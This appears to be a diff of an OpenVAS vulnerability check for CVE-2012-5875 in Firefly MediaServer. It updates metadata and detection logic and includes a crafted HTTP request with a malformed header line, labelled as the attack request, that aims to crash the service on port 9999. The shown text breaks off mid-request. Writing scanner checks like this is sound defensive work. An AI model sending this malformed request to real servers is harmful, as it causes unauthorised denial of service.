@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_firefly_mediaserver_mult_dos_vuln.nasl 3565 2016-06-21 07:20:17Z benallard $
+# $Id: gb_firefly_mediaserver_mult_dos_vuln.nasl 5841 2017-04-03 12:46:41Z cfi $
 #
 # Firefly MediaServer HTTP Header Multiple DoS Vulnerabilities
 #
@@ -47,12 +47,12 @@ denial of service vulnerabilities.";
 if(description)
 {
   script_id(803080);
-  script_version("$Revision: 3565 $");
+  script_version("$Revision: 5841 $");
   script_cve_id("CVE-2012-5875");
   script_bugtraq_id(56999);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:20:17 +0200 (Tue, 21 Jun 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:46:41 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2012-12-20 15:49:00 +0530 (Thu, 20 Dec 2012)");
   script_name("Firefly MediaServer HTTP Header Multiple DoS Vulnerabilities");
   script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80743");
@@ -60,11 +60,14 @@ if(description)
   script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23129");
   script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118963/");
 
-  script_summary("Determine if Firefly MediaServer is affected");
   script_category(ACT_DENIAL);
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
   script_family("Denial of Service");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports(9999);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+
   script_tag(name : "impact" , value : tag_impact);
   script_tag(name : "affected" , value : tag_affected);
   script_tag(name : "insight" , value : tag_insight);
@@ -73,7 +76,6 @@ if(description)
   script_tag(name:"solution_type", value:"WillNotFix");
   exit(0);
 }
-
 
 include("http_func.inc");
 
@@ -84,32 +86,22 @@ fmReq = "";
 
 ## Get Firefly MediaServer default TCP Port
 fmPort = 9999;
-
-## Check Port State
 if(!get_port_state(fmPort)){
   exit(0);
 }
 
-## Get hostname
-host = get_host_name();
-if(!host)
- exit(0);
-
-## Construct Normal Get Request
-fmReq = string("GET / HTTP/1.1\r\n",
-               "Host: ", host, "\r\n\r\n");
-
-fmRes = http_send_recv(port: fmPort, data:fmReq);
-
+banner = get_http_banner(port:fmPort);
 ## Confirm the application before trying exploit
-if("Server: mt-daapd" >!< fmRes){
+if("Server: mt-daapd" >!< banner){
   exit(0);
 }
+
+host = http_host_name(port:fmPort);
 
 ## Construct and Send attack Request
 fmExp = string("GET / HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
-               "User-Agent: Mozilla/5.0 (Windows; U)\r\n",
+               "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Accept-Language: en-us\r\n",
                "en;q=0.5\r\n",
                "\r\n",
